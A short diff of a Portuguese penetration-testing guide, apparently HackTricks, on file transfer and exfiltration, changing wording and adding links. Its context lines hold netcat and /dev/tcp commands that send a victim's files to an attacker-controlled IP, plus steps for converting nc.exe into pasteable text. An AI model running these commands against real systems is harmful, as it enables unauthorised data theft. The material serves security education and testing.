@@ -199,7 +199,7 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Enviar arquivo para a vítima
+### Fazer upload de arquivo para a vítima
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -302,8 +302,12 @@ O programa `debug.exe` não apenas permite a inspeção de binários, mas també
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Em seguida, cole o texto no windows-shell e um arquivo chamado nc.exe será criado.
+Então copie e cole o texto no windows-shell e um arquivo chamado nc.exe será criado.
+
+- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
+
+- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
 {{#include ../banners/hacktricks-training.md}}
